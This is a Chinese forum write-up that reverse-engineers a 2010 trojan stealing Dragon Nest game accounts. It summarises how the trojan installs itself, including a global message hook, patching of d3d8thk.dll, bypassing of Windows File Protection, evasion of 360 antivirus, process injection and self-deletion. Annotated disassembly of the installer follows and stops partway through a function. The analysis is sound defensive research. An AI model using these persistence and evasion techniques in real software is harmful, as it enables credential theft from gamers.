
# "龙之谷"盗号木马详细分析

> 原文：[`www.pediy.com/kssd/pediy11/119877.html`](https://www.pediy.com/kssd/pediy11/119877.html)

病毒的时间戳是 `08/13/2010`

逆了木马主体所有函数，释放出的`bin`没有看，放全局消息钩子来截获信息。

代码中有很多填充内容的部分，繁琐无味，我帖的时候去除了这些无意义代码。

病毒样本已经在四楼上传。有对`bin`感兴趣的朋友不妨看看

这个病毒自身验证的过程我之前的一个帖子说了：

传送门~

[`bbs.pediy.com/showthread.php?t=119736`](http://bbs.pediy.com/showthread.php?t=119736)

先看说明，再看代码~

1. 从自身提取一个名为 `"MWAI"` 的资源，并释放到系统临时文件夹中，名称为`kb****.bin`（`*`的是 0~9 的随机数字）。

2. 接着进行自身验证，通过比较当前进程文件的最后 8 位是否为`7001000000010000`来判断木马是否完整（比如脱壳的版本~因为这个木马用的`PEcompect`壳，可以用脱壳机直接脱掉），如果验证通过，则提取当前木马文件的后`0x170`个字节内容追加到刚刚释放的`bin`文件中，来完成`bin`文件的组装。

3. 先在 `"SOFTWARE\\snda\\dn"` 中找游戏路径，如果没找到，则到 `"Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"` 中寻找。

4. 删除游戏目录下的`mfc42.log`文件。

5. 把释放出的`bin`复制一份到系统目录`\\system`下并修改后缀为`axs`，并设置隐藏属性。

6. `LoadLibrary`加载释放出的`bin`，并调用其`LoadDll`函数，安装全局`WH_GETMESSAGE`钩子。

7. 复制释放的`bin`到游戏目录下，并命名为`mfc42.log`，设置隐藏属性。

8. 判断 `"系统目录\\DllCache"` 下和 `"系统目录\\system\\"` 下是否存在 `"d3d8thk.dll"` 文件，如果存在则备份到 `"系统目录\\d3d8thk.dll.dat"`。

9. 打开 `"系统目录\\d3d8thk.dll.dat"` 读取该 PE 文件各部分信息存放到一自定义结构体，一个`buffer`局部变量指针，一个`sections`指针数组中，结构体说明如下：

   - `[esi] = buffer`：存放 pe 文件指针
   - `[esi+8] = IMAGE_DOS_HEADER`
   - `[esi+c] = dos stub`
   - `[esi+10] = dos stub 大小`
   - `[esi+14] = 0x40(IMAGE_DOS_HEADER 大小)`
   - `[esi+18] = IMAGE_NT_HEADER`
   - `[esi+1c] = 第一个 IMAGE_SECTION_HEADER 结构`
   - `[esi+20] = 第二个`
   - 依次类推~

   ```c
   struct _PEINFO{
       LPCSTR lpImage_Dos_Header;
       LPCSTR lpImage_Dos_Stub;
       int iSizeOfDosStub;
       int iSizeOfDosHeader;
       LPCSTR lpImage_Nt_Header;
       LPCSTR lpImage_Section_Header[0x10]
   }
   ```

   `[esi+1c+50]` 中保存着各个 SECTIONS 的数据指针 `+4` 依次类推~

   ```c
   LPCSTR lpSections[0x10];
   ```

10. 在该 `"系统目录\\d3d8thk.dll.dat"` 文件中搜索分别搜索 `".code"` 和 `".text"` 节，复制自身的 `0x00407034` 位置的 `357` 个字节内容到目标 section 头，判断目标 section 的 `offset0x164` 处的值，如果正确写入了数据，则该处的数据应该为 `0x9090`，然后在目标 section 中继续搜索 `"246"`，在其后面填充内容 `"kb****.axs"`，在 `"246"` 前填充一个 `0x70`（ascii 的 p）。

11. 把修改后的 `"系统目录\\d3d8thk.dll.dat"` 写回。

12. 复制 `"系统目录\\d3d8thk.dll.dat"` 到 `"游戏目录\\d3d8thk.dll"`

13. 移动 `"系统目录\\system\\d3d8thk.dll"` 到 `"系统目录\\system\\d3d8thk.dll.****"`（4 个随机大写字符），然后马上删除 `"系统目录\\system\\d3d8thk.dll.****"`（4 个随机大写字符）。移动 `"系统目录\\d3d8thk.dll"` 到 `"系统目录\\d3d8thk.dll.****"`（4 个随机大写字符）。

14. 判断 `"系统目录\\DllCache\\d3d8thk.dll"` 是否存在，如果存在，检测是否存在 360，如果存在，则利用技巧躲避 360 的 api 调用检查来调用 `sfc_os.dll` 5 号函数，从而修改系统文件。如果没有 360，则依次检查 `"conime.exe"`、`"IEXPLORER.EXE"`、`"ctfmon.exe"`、`"explorer.exe"` 进程，如果其中一个进程存在，则注入该进程，并执行指定代码，进行提权和执行 5 号函数，并移动 `"系统目录\\DllCache\\d3d8thk.dll"`。但这个地方比较有趣，就是实际上如果没有 360 的话，这个操作无法成功，因为在注入远程进程中的代码中存在 bug，无法完成系统函数移动的操作，具体请看代码。

15. 移动 `"系统目录\\DllCache\\d3d8thk.dll"` 到 `"系统目录\\DllCache\\d3d8thk.dll.****"`（4 个随机大写字符）

16. 复制 `"系统目录\\d3d8thk.dll.dat"` 到 `"系统目录\\system\\d3d8thk.dll.dat"`

17. `"系统目录\\system\\d3d8thk.dll.dat"` 改名为 `"系统目录\\system\\d3d8thk.dll"`

18. 复制文件 `"系统目录\\d3d8thk.dll.dat"` 到 `"系统目录\\DllCache\\d3d8thk.dll"`

19. 删除在临时文件夹中释放出的`bin`文件

20. 获取环境变量 `"TEMP"` 中的临时文件路径，并在其目录下创建名为 `"临时文件路径\\tempVidio.bat"` 的批处理文件，并执行该文件，执行操作：删除病毒本身，然后删除批处理本身。

## 【第零段】

在当前系统中寻找 `dnlauncher.exe` 和 `DragonNest.exe` 游戏进程，如果发现则关闭进程

代码：

```asm
00402C75  /$ 55             push    ebp
00402C76  |. 8BEC          mov     ebp, esp
00402C78  |. 83EC 34       sub     esp, 34
00402C7B  |. 32C0          xor     al, al
00402C7D  |. 6A 01         push    1
00402C7F  |. 8845 FE       mov     byte ptr [ebp-2], al
00402C82  |. 8845 EE       mov     byte ptr [ebp-12], al
00402C85  |. 8845 DC       mov     byte ptr [ebp-24], al
00402C88  |. 8D45 CC       lea     eax, dword ptr [ebp-34]
00402C8B  |. 50            push    eax
00402C8C  |. C645 F0 64    mov     byte ptr [ebp-10], 64
00402C90  |. C645 F1 6E    mov     byte ptr [ebp-F], 6E
00402C94  |. C645 F2 6C    mov     byte ptr [ebp-E], 6C
00402D38  |. C645 DB 65    mov     byte ptr [ebp-25], 65
00402D3C  |. E8 0CE6FFFF   call    0040134D                              ; 提权操作
00402D41  |. 8D45 F0       lea     eax, dword ptr [ebp-10]              ; eax = "dnlauncher.exe"
00402D44  |. 50            push    eax                                    ; 压入龙之谷游戏进程"dnlauncher.exe"
00402D45  |. E8 B6E2FFFF   call    00401000                              ; 寻找龙之谷进程"dnlauncher.exe"信息 如果找到则返回龙之谷进程 ID,否则返回 0
00402D4A  |. 50            push    eax
00402D4B  |. E8 B7E4FFFF   call    00401207                              ; 关闭龙之谷进程
00402D50  |. 8D45 E0       lea     eax, dword ptr [ebp-20]              ; eax = "DragonNest.exe"
00402D53  |. 50            push    eax
00402D54  |. E8 A7E2FFFF   call    00401000                              ; 寻找龙之谷进程"DragonNest.exe"信息 如果找到则返回龙之谷进程 ID,否则返回 0
00402D59  |. 50            push    eax
00402D5A  |. E8 A8E4FFFF   call    00401207                              ; 关闭找到的进程
00402D5F  |. 83C4 18       add     esp, 18
00402D62  |. 6A 50         push    50                                     ; /Timeout = 80. ms
00402D64  |. FF15 1C604000 call    dword ptr [<&kernel32.Sleep>]         ; \\睡眠 50ms
00402D6A  |. C9            leave
00402D6B  \. C3            retn
```

## 【第一段】

核心过程：

代码：



这是一段 x86 汇编代码，以下为其格式化后的代码块：

```
00402D6C  /$  55                    push    ebp
00402D6D  |.  8BEC                  mov     ebp, esp
00402D6F  |.  81EC 04090000         sub     esp, 904                              ;  分配 0x904 大小的栈空间
00402D75  |.  53                    push    ebx
00402D76  |.  56                    push    esi
00402D77  |.  57                    push    edi
00402D78  |.  6A 40                 push    40
00402D7A  |.  5A                    pop     edx                                   ;  edx = 0x40
00402D7B  |.  33DB                  xor     ebx, ebx                              ;  ebx = 0
00402D7D  |.  8BCA                  mov     ecx, edx
00402D7F  |.  33C0                  xor     eax, eax                              ;  eax = 0
00402D81  |.  8DBD 11FCFFFF         lea     edi, dword ptr [ebp-3EF]              ;  edi = 栈空间指针
00402D87  |.  889D 10FCFFFF         mov     byte ptr [ebp-3F0], bl                ;  在 edi 前面填充一个 0
00402D8D  |.  F3:AB                 rep     stos dword ptr es:[edi]               ;  在 ebp-3ef 中填充 0x40 个 DWORD  0
00402D8F  |.  66:AB                 stos    word ptr es:[edi]                     ;  再添加一个字的 0
00402D91  |.  AA                    stos    byte ptr es:[edi]                     ;  继续添加一个 byte 的 0
00402D92  |.  8BCA                  mov     ecx, edx                              ;  ecx = 0x40
00402D94  |.  33C0                  xor     eax, eax
00402D96  |.  8DBD 05F9FFFF         lea     edi, dword ptr [ebp-6FB]              ;  同上，只是栈指针不同，都是填充了 100 个 byte 的 0 到栈中
00402D9C  |.  889D 04F9FFFF         mov     byte ptr [ebp-6FC], bl
00402DA2  |.  F3:AB                 rep     stos dword ptr es:[edi]
00402DA4  |.  66:AB                 stos    word ptr es:[edi]
00402DA6  |.  AA                    stos    byte ptr es:[edi]
00402DA7  |.  8BCA                  mov     ecx, edx
00402E0F  |.  C645 B4 4B            mov     byte ptr [ebp-4C], 4B                 ;  给局部字符串数组填充内容"kernel32.dll"
00402E82  |.  8D45 AC               lea     eax, dword ptr [ebp-54]
00402E85  |.  6A 75                 push    75
00402E87  |.  50                    push    eax                                   ;  把 ebp-54 的栈指针压入
00402E88  |.  C685 5CFFFFFF 53      mov     byte ptr [ebp-A4], 53
00402E8F  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  压入第三个参数，既堆空间指针
00402E92  |.  C685 5DFFFFFF 4F      mov     byte ptr [ebp-A3], 4F                 ;  填充内容"SOFTWARE\\snda\\dn"
00402E99  |.  C685 5EFFFFFF 46      mov     byte ptr [ebp-A2], 46
00402EA0  |.  C685 5FFFFFFF 54      mov     byte ptr [ebp-A1], 54
00402EA7  |.  C685 60FFFFFF 57      mov     byte ptr [ebp-A0], 57
00402EAE  |.  C685 61FFFFFF 41      mov     byte ptr [ebp-9F], 41
00402EB5  |.  C685 62FFFFFF 52      mov     byte ptr [ebp-9E], 52
00402EBC  |.  C685 63FFFFFF 45      mov     byte ptr [ebp-9D], 45
00402EC3  |.  C685 64FFFFFF 5C      mov     byte ptr [ebp-9C], 5C
00402ECA  |.  C685 65FFFFFF 73      mov     byte ptr [ebp-9B], 73
00402ED1  |.  C685 66FFFFFF 6E      mov     byte ptr [ebp-9A], 6E
00402ED8  |.  C685 67FFFFFF 64      mov     byte ptr [ebp-99], 64
00402EDF  |.  C685 68FFFFFF 61      mov     byte ptr [ebp-98], 61
00402EE6  |.  C685 69FFFFFF 5C      mov     byte ptr [ebp-97], 5C
00402EED  |.  C685 6AFFFFFF 64      mov     byte ptr [ebp-96], 64
00402EF4  |.  C685 6BFFFFFF 6E      mov     byte ptr [ebp-95], 6E
00402EFB  |.  889D 6CFFFFFF         mov     byte ptr [ebp-94], bl
00402F01  |.  C645 A4 6C            mov     byte ptr [ebp-5C], 6C                 ;  填充内容"loader"
00402F05  |.  C645 A5 6F            mov     byte ptr [ebp-5B], 6F
00402F09  |.  C645 A6 61            mov     byte ptr [ebp-5A], 61
00402F0D  |.  C645 A7 64            mov     byte ptr [ebp-59], 64
00402F11  |.  C645 A8 65            mov     byte ptr [ebp-58], 65
00402F15  |.  C645 A9 72            mov     byte ptr [ebp-57], 72
00402F19  |.  885D AA               mov     byte ptr [ebp-56], bl
00402F1C  |.  C685 70FFFFFF 5C      mov     byte ptr [ebp-90], 5C                 ;  填充内容"\\DNLauncher.exe"
00402F23  |.  C685 71FFFFFF 44      mov     byte ptr [ebp-8F], 44
00402F2A  |.  C685 72FFFFFF 4E      mov     byte ptr [ebp-8E], 4E
00402F31  |.  C685 73FFFFFF 4C      mov     byte ptr [ebp-8D], 4C
00402F38  |.  C685 74FFFFFF 61      mov     byte ptr [ebp-8C], 61
00402F3F  |.  C685 75FFFFFF 75      mov     byte ptr [ebp-8B], 75
00402F46  |.  C685 76FFFFFF 6E      mov     byte ptr [ebp-8A], 6E
00402F4D  |.  C685 77FFFFFF 63      mov     byte ptr [ebp-89], 63
00402F54  |.  C685 78FFFFFF 68      mov     byte ptr [ebp-88], 68
00402F5B  |.  C685 79FFFFFF 65      mov     byte ptr [ebp-87], 65
00402F62  |.  C685 7AFFFFFF 72      mov     byte ptr [ebp-86], 72
00402F69  |.  C685 7BFFFFFF 2E      mov     byte ptr [ebp-85], 2E
00402F70  |.  C685 7CFFFFFF 65      mov     byte ptr [ebp-84], 65
00402F77  |.  C685 7DFFFFFF 78      mov     byte ptr [ebp-83], 78
00402F7E  |.  C685 7EFFFFFF 65      mov     byte ptr [ebp-82], 65
00402F85  |.  889D 7FFFFFFF         mov     byte ptr [ebp-81], bl
00402F8B  |.  C645 AC 57            mov     byte ptr [ebp-54], 57                 ;  填充内容"WMAT"
00402F8F  |.  C645 AD 4D            mov     byte ptr [ebp-53], 4D
00402F93  |.  C645 AE 41            mov     byte ptr [ebp-52], 41
00402F97  |.  C645 AF 54            mov     byte ptr [ebp-51], 54
00402F9B  |.  885D B0               mov     byte ptr [ebp-50], bl
00402F9E  |.  E8 62F6FFFF           call    00402605                              ;  在系统临时文件目录中释放一个名称为 kb\*\*\*\*.bin 的文件，其中\*为 0~9 的随即数字
00402FA3  |.  83C4 0C               add     esp, 0C
00402FA6  |.  85C0                  test    eax, eax                              ;  释放成功则返回 TRUE 否则返回 FALSE
00402FA8  |.  74 09                 je      short 00402FB3                        ;  判断文件是否释放成功,失败则跳转
00402FAA  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  压入刚刚释放的文件路径
00402FAD  |.  E8 7CFAFFFF           call    00402A2E                              ;  这个函数还是有点意思，他首先对自身进行验证，通过特征码来判断当前文件是否被脱壳了，如果没脱壳，则进行组装，从病毒原体中提取最后的 0x170 个字节然后写入刚刚创建的 bin 文件的结尾
00402FB2  |.  59                    pop     ecx                                   ;  ecx = 文件绝对路径
00402FB3  |>  FF75 0C               push    dword ptr [ebp+C]                   ;  压入刚刚释放的文件路径
00402FB6  |.  E8 74E7FFFF           call    0040172F                              ;  返回绝对路径的长度 strlen
00402FBB  |.  85C0                  test    eax, eax                              ;  测试返回值是否为 0
00402FBD  |.  59                    pop     ecx                                   ;  ecx = 文件绝对路径
00402FBE  |.  0F84 1E050000         je      004034E2                              ;  返回 0，则跳转
00402FC4  |.  8B35 00604000         mov     esi, dword ptr [<&kernel32.LoadLibraryA>]   ;  kernel32.LoadLibraryA
00402FCA  |.  8D45 8C               lea     eax, dword ptr [ebp-74]               ;  eax = CopyFileA
00402FCD  |.  50                    push    eax
00402FCE  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  eax = Kernel32.dll
00402FD1  |.  50                    push    eax                                   ; /FileName
00402FD2  |.  FFD6                  call    esi                                   ; \LoadLibraryA Kernel32.dll
00402FD4  |.  50                    push    eax                                   ;  压入 kernel32.dll 的 HMODULE
00402FD5  |.  E8 57E9FFFF           call    00401931                              ;  GetProcAddress 获取 CopyFileA 函数地址
00402FDA  |.  8985 58FFFFFF         mov     dword ptr [ebp-A8], eax               ;  把 CopyFileA 函数地址传到局部空间中保存
00402FE0  |.  8D85 70FFFFFF         lea     eax, dword ptr [ebp-90]               ;  eax = "DNLauncher.exe"
00402FE6  |.  50                    push    eax
00402FE7  |.  8D45 A4               lea     eax, dword ptr [ebp-5C]               ;  eax = "loader"
00402FEA  |.  50                    push    eax
00402FEB  |.  8D85 5CFFFFFF         lea     eax, dword ptr [ebp-A4]               ;  eax = "SOFTWARE\\snda\\dn"
00402FF1  |.  50                    push    eax
00402FF2  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
00402FF8  |.  68 02000080           push    80000002                              ;  权限值
00402FFD  |.  50                    push    eax                                   ;  缓冲区 buffer，用于保存游戏绝对路径
00402FFE  |.  C645 98 6D            mov     byte ptr [ebp-68], 6D
00403002  |.  C645 99 66            mov     byte ptr [ebp-67], 66
00403006  |.  C645 9A 63            mov     byte ptr [ebp-66], 63
0040300A  |.  C645 9B 34            mov     byte ptr [ebp-65], 34
0040300E  |.  C645 9C 32            mov     byte ptr [ebp-64], 32
00403012  |.  C645 9D 2E            mov     byte ptr [ebp-63], 2E
00403016  |.  C645 9E 6C            mov     byte ptr [ebp-62], 6C
0040301A  |.  C645 9F 6F            mov     byte ptr [ebp-61], 6F
0040301E  |.  C645 A0 67            mov     byte ptr [ebp-60], 67
00403022  |.  885D A1               mov     byte ptr [ebp-5F], bl
00403025  |.  C645 80 44            mov     byte ptr [ebp-80], 44                 ;  填充"DeleteFileA"
00403029  |.  C645 81 65            mov     byte ptr [ebp-7F], 65
0040302D  |.  C645 82 6C            mov     byte ptr [ebp-7E], 6C
00403031  |.  C645 83 65            mov     byte ptr [ebp-7D], 65
00403035  |.  C645 84 74            mov     byte ptr [ebp-7C], 74
00403039  |.  C645 85 65            mov     byte ptr [ebp-7B], 65
0040303D  |.  C645 86 46            mov     byte ptr [ebp-7A], 46
00403041  |.  C645 87 69            mov     byte ptr [ebp-79], 69
00403045  |.  C645 88 6C            mov     byte ptr [ebp-78], 6C
00403049  |.  C645 89 65            mov     byte ptr [ebp-77], 65
0040304D  |.  C645 8A 41            mov     byte ptr [ebp-76], 41
00403051  |.  885D 8B               mov     byte ptr [ebp-75], bl
00403054  |.  E8 63EEFFFF           call    00401EBC                              ;  先在"SOFTWARE\\snda\\dn"中找游戏路径，如果没找到，则到"Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"中寻找，找到返回 1，失败返回 0
00403059  |.  83C4 1C               add     esp, 1C                               ;  堆栈平衡
0040305C  |.  85C0                  test    eax, eax                              ;  判断是否找到
0040305E  |.  0F84 F7000000         je      0040315B                              ;  如果没找到游戏路径，则跳转
00403064  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]               ;  eax = 游戏路径
0040306A  |.  C645 E2 5C            mov     byte ptr [ebp-1E], 5C
0040306E  |.  50                    push    eax                                   ; /游戏文件路径
0040306F  |.  885D E3               mov     byte ptr [ebp-1D], bl                 ; |
00403072  |.  E8 7F220000           call    <jmp.&MSVCRT.strlen>                 ; \strlen
00403077  |.  80BC05 13FDFFFF 5C    cmp     byte ptr [ebp+eax-2ED], 5C            ;  查看路径是否以"\\"结尾
0040307F  |.  59                    pop     ecx
00403080  |.  74 12                 je      short 00403094                        ;  如果路径是以"\\"结尾，则直接 strcat"mfc43.log"，否则先在最后添加"\\"
00403082  |.  8D45 E2               lea     eax, dword ptr [ebp-1E]
00403085  |.  50                    push    eax
00403086  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
0040308C  |.  50                    push    eax
0040308D  |.  E8 B3E6FFFF           call    00401745                              ;  strcat "\\"
00403092  |.  59                    pop     ecx
00403093  |.  59                    pop     ecx
00403094  |>  8D45 98               lea     eax, dword ptr [ebp-68]               ;  "mfc43.log"
00403097  |.  50                    push    eax
00403098  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]
0040309E  |.  50                    push    eax
0040309F  |.  E8 A1E6FFFF           call    00401745                              ;  strcat  "mfc43.log" 生成绝对路径
004030A4  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
004030AA  |.  50                    push    eax                                   ;  eax = 游戏目录
004030AB  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
004030B1  |.  50                    push    eax
004030B2  |.  E8 97E5FFFF           call    0040164E                              ;  strcpy  把游戏目录存入 ebp-3F0
004030B7  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
004030BD  |.  50                    push    eax
004030BE  |.  8D85 00F8FFFF         lea     eax, dword ptr [ebp-800]
004030C4  |.  50                    push    eax
004030C5  |.  E8 84E5FFFF           call    0040164E                              ;  strcpy  把游戏目录存入 ebp-800
004030CA  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]
004030D0  |.  50                    push    eax
004030D1  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
004030D7  |.  50                    push    eax
004030D8  |.  E8 68E6FFFF           call    00401745                              ;  strcat  生成目录游戏目录\\mfc42.log
004030DD  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]               ;  游戏目录\\mfc42.log
004030E3  |.  C745 C4 01000000      mov     dword ptr [ebp-3C], 1
004030EA  |.  50                    push    eax                                   ;  游戏目录\\mfc42.log
004030EB  |.  E8 7FE6FFFF           call    0040176F                              ;  判断指定文件是否存在，失败返回 0
004030F0  |.  83C4 24               add     esp, 24                               ;  堆栈平衡
004030F3  |.  85C0                  test    eax, eax
004030F5  |.  74 32                 je      short 00403129                        ;  如果文件不存在，则跳转
004030F7  |.  8D45 80               lea     eax, dword ptr [ebp-80]               ;  DeleteFileA
004030FA  |.  50                    push    eax
004030FB  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004030FE  |.  50                    push    eax
004030FF  |.  FFD6                  call    esi                                   ;  LoadLibraryA
00403101  |.  50                    push    eax
00403102  |.  E8 2AE8FFFF           call    00401931                              ;  GetProAddress  DeleteFileA
00403107  |.  59                    pop     ecx
00403108  |.  8BF8                  mov     edi, eax                              ;  edi = DeleteFileA 的地址
0040310A  |.  59                    pop     ecx
0040310B  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
00403111  |.  50                    push    eax                                   ;  游戏目录\\mfc42.log
00403112  |.  FFD7                  call    edi                                   ;  DeleteFileA
00403114  |.  85C0                  test    eax, eax
00403116  |.  75 03                 jnz     short 0040311B                        ;  如果删除失败则跳转
00403118  |.  895D C4               mov     dword ptr [ebp-3C], ebx               ;  ebp-3c = 0
0040311B  |>  8D85 04F9FFFF         lea     eax, dword ptr [ebp-6FC]               ;  eax = mfc42.log 文件绝对路径
00403121  |.  50                    push    eax
00403122  |.  FFD7                  call    edi                                   ;  DeleteFileA
00403124  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
00403127  |.  74 32                 je      short 0040315B                        ;  如果成功删除则跳转
00403129  |>  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
0040312F  |.  50                    push    eax                                   ;  eax = mfc42.log 文件绝对路径
00403130  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]
00403136  |.  50                    push    eax                                   ;  buffer
00403137  |.  E8 12E5FFFF           call    0040164E                              ;  strcpy
0040313C  |.  8D85 04F9FFFF         lea     eax, dword ptr [ebp-6FC]               ;  eax = mfc42.log 文件绝对路径
00403142  |.  50                    push    eax
00403143  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
00403149  |.  50                    push    eax
0040314A  |.  E8 FFE4FFFF           call    0040164E                              ;  strcpy
0040314F  |.  83C4 10               add     esp, 10
00403152  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
00403155  |.  0F85 1E010000         jnz     00403279
0040315B  |>  6A 0E                 push    0E
0040315D  |.  33C0                  xor     eax, eax
0040315F  |.  59                    pop     ecx                                   ;  ecx = 0x0E
00403160  |.  8DBD 1DFFFFFF         lea     edi, dword ptr [ebp-E3]
00403166  |.  889D 1CFFFFFF         mov     byte ptr [ebp-E4], bl
0040316C  |.  6A 5C                 push    5C                                    ;  "\\"
0040316E  |.  F3:AB                 rep     stos dword ptr es:[edi]               ;  填充 0x0E 个 DWORD0
00403170  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  释放的 bin 的文件路径
00403173  |.  C645 DC 5C            mov     byte ptr [ebp-24], 5C                 ;  填充"\\system\\"
00403177  |.  66:AB                 stos    word ptr es:[edi]
00403179  |.  AA                    stos    byte ptr es:[edi]
0040317A  |.  C645 DD 73            mov     byte ptr [ebp-23], 73
0040317E  |.  C645 DE 79            mov     byte ptr [ebp-22], 79
00403182  |.  C645 DF 73            mov     byte ptr [ebp-21], 73
00403186  |.  C645 E0 74            mov     byte ptr [ebp-20], 74
0040318A  |.  C645 E1 65            mov     byte ptr [ebp-1F], 65
0040318E  |.  C645 E2 6D            mov     byte ptr [ebp-1E], 6D
00403192  |.  C645 E3 5C            mov     byte ptr [ebp-1D], 5C
00403196  |.  885D E4               mov     byte ptr [ebp-1C], bl
00403199  |.  E8 88E4FFFF           call    00401626                              ;  strrchr 反方向查询字符第一次出现时的指针位置
0040319E  |.  8BF8                  mov     edi, eax                              ;  edi = 最后一个"\\"的位置
004031A0  |.  47                    inc     edi                                   ;  edi ++
004031A1  |.  57                    push    edi                                   ;  指向文件名
004031A2  |.  E8 88E5FFFF           call    0040172F                              ;  strlen
004031A7  |.  83E8 03               sub     eax, 3                                ;  eax = 文件名长度-3
004031AA  |.  50                    push    eax                                   ; /maxlen
004031AB  |.  8D85 1CFFFFFF         lea     eax, dword ptr [ebp-E4]               ; |
004031B1  |.  57                    push    edi                                   ; |src
004031B2  |.  50                    push    eax                                   ; |dest
004031B3  |.  FF15 54604000         call    dword ptr [<&MSVCRT.strncpy>]        ; \strncpy
004031B9  |.  8D85 1CFFFFFF         lea     eax, dword ptr [ebp-E4]
004031BF  |.  68 28704000           push    00407028                              ;  ASCII "axs"
004031C4  |.  50                    push    eax
004031C5  |.  E8 7BE5FFFF           call    00401745                              ;  strcat  生成一个与刚刚释放的 bin 同名的 axs 后缀的文件名
004031CA  |.  8D85 1CFFFFFF         lea     eax, dword ptr [ebp-E4]               ;  kb\*\*\*\*.axs
004031D0  |.  50                    push    eax
004031D1  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]
004031D7  |.  50                    push    eax
004031D8  |.  E8 71E4FFFF           call    0040164E                              ;  strcpy
004031DD  |.  83C4 28               add     esp, 28                               ;  堆栈平衡
004031E0  |.  8D45 E8               lea     eax, dword ptr [ebp-18]
004031E3  |.  C645 E8 47            mov     byte ptr [ebp-18], 47                 ;  填充"GetWindowsDirectoryA"
004031E7  |.  C645 E9 65            mov     byte ptr [ebp-17], 65
004031EB  |.  50                    push    eax
004031EC  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004031EF  |.  50                    push    eax
004031F0  |.  C645 EA 74            mov     byte ptr [ebp-16], 74
004031F4  |.  C645 EB 57            mov     byte ptr [ebp-15], 57
004031F8  |.  C645 EC 69            mov     byte ptr [ebp-14], 69
004031FC  |.  C645 ED 6E            mov     byte ptr [ebp-13], 6E
00403200  |.  C645 EE 64            mov     byte ptr [ebp-12], 64
00403204  |.  C645 EF 6F            mov     byte ptr [ebp-11], 6F
00403208  |.  C645 F0 77            mov     byte ptr [ebp-10], 77
0040320C  |.  C645 F1 73            mov     byte ptr [ebp-F], 73
00403210  |.  C645 F2 44            mov     byte ptr [ebp-E], 44
00403214  |.  C645 F3 69            mov     byte ptr [ebp-D], 69
00403218  |.  C645 F4 72            mov     byte ptr [ebp-C], 72
0040321C  |.  C645 F5 65            mov     byte ptr [ebp-B], 65
00403220  |.  C645 F6 63            mov     byte ptr [ebp-A], 63
00403224  |.  C645 F7 74            mov     byte ptr [ebp-9], 74
00403228  |.  C645 F8 6F            mov     byte ptr [ebp-8], 6F
0040322C  |.  C645 F9 72            mov     byte ptr [ebp-7], 72
00403230  |.  C645 FA 79            mov     byte ptr [ebp-6], 79
00403234  |.  C645 FB 41            mov     byte ptr [ebp-5], 41
00403238  |.  885D FC               mov     byte ptr [ebp-4], bl
0040323B  |.  FFD6                  call    esi                                   ;  LoadLibraryA
0040323D  |.  50                    push    eax
0040323E  |.  E8 EEE6FFFF           call    00401931                              ;  GetProcAddress GetWindowsDirectoryA
00403243  |.  59                    pop     ecx
00403244  |.  59                    pop     ecx
00403245  |.  8D8D 18FEFFFF         lea     ecx, dword ptr [ebp-1E8]
0040324B  |.  68 04010000           push    104                                   ;  MAX\_PATH
00403250  |.  51                    push    ecx                                   ;  buffer 用以接受系统目录
00403251  |.  FFD0                  call    eax                                   ;  GetWindowsDirectoryA
00403253  |.  8D45 DC               lea     eax, dword ptr [ebp-24]               ;  "\\system\\"
00403256  |.  50                    push    eax
00403257  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  系统目录
0040325D  |.  50                    push    eax
0040325E  |.  E8 E2E4FFFF           call    00401745                              ;  strcat 生成目录 windows\\system\\
00403263  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]               ;  kb\*\*\*\*.axs
00403269  |.  50                    push    eax
0040326A  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\
00403270  |.  50                    push    eax
00403271  |.  E8 CFE4FFFF           call    00401745                              ;  strcat 连接成 kb\*\*\*\*.axs 的绝对路径
00403276  |.  83C4 10               add     esp, 10
00403279  |>  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\kb\*\*\*\*.axs
0040327F  |.  50                    push    eax
00403280  |.  E8 AAE4FFFF           call    0040172F                              ;  strlen
00403285  |.  85C0                  test    eax, eax
00403287  |.  59                    pop     ecx
00403288  |.  0F84 2F010000         je      004033BD                              ;  函数返回 0，则跳转
0040328E  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\kb\*\*\*\*.axs
00403294  |.  53                    push    ebx
00403295  |.  50                    push    eax                                   ;  目录 windows\\system\\kb\*\*\*\*.axs
00403296  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  释放出的 bin 的绝对路径
00403299  |.  FF95 58FFFFFF         call    dword ptr [ebp-A8]                  ;  CopyFileA 复制释放的 bin 到系统目录 system 中一份
0040329F  |.  85C0                  test    eax, eax
004032A1  |.  0F84 16010000         je      004033BD
004032A7  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
004032AA  |.  0F84 D7000000         je      00403387                              ;  如果复制失败则跳转
004032B0  |.  8D45 C8               lea     eax, dword ptr [ebp-38]
004032B3  |.  C645 C8 47            mov     byte ptr [ebp-38], 47                 ;  填充 GetFileAttributesA
